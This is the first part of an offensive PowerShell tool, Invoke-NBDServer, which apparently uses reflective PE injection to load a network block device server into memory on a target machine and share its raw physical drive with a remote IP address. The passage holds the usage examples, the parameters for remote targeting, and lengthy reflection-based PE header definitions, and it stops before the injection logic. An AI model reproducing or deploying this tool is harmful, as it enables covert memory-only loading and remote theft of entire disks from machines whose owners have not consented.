function Invoke-NBDServer
{
<#
.SYNOPSIS

This script leverages a modified version of Jeff Bryner's NBDServer project 
and PowerSploit's Invoke-ReflectivePEInjection to load a NBD server into memory.
This allows a remote system to mount a drive on the target system.

Function: Invoke-NBDServer
Author: Joe Bialek, Twitter: @JosephBialek
NBDServer Author: BJeff Bryner (X)
License: GPL version 2.0 (http://www.vanheusden.com/license.txt)

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER ClientIP

Mandatory, client IP address to accept connections from.

.PARAMETER FileToServe

Optional, file to serve ( \\.\PHYSICALDRIVE0 for example).

.PARAMETER PartitionToServe

Optional, partition on disk to serve (0 if not specified)

.PARAMETER ListenPort

Optional, port to listen on (60000 by default).


.EXAMPLE

Start the NBD server, only allowing 192.168.52.100 to connect, and share out \\.\PHYSICALDRIVE0
Invoke-NBDServer -ClientIP 192.168.52.100 -FileToServe \\.\PHYSICALDRIVE0

.EXAMPLE

Start the NBD server, only allowing 192.168.52.100 to connect, share out \\.\PHYSICALDRIVE0 and only partition 1.
Invoke-NBDServer -ClientIP 192.168.52.100 -FileToServe \\.\PHYSICALDRIVE0 -PartitionToServe 1


.LINK
Github repo for NBDserver: https://github.com/jeffbryner/NBDServer
Github repo for Invoke-ReflectivePEInjection: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
#>

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $ComputerName,

    [Parameter(Position = 1, Mandatory = $true)]
    [String]
    $ClientIP,

    [Parameter(Position = 2)]
    [String]
    $FileToServe = "\\.\PHYSICALDRIVE0",

    [Parameter(Position = 3)]
    [String]
    $PartitionToServe = "0",

    [Parameter(Position = 4)]
    [String]
    $ListenPort = "60000"
    
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
    )
    
    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
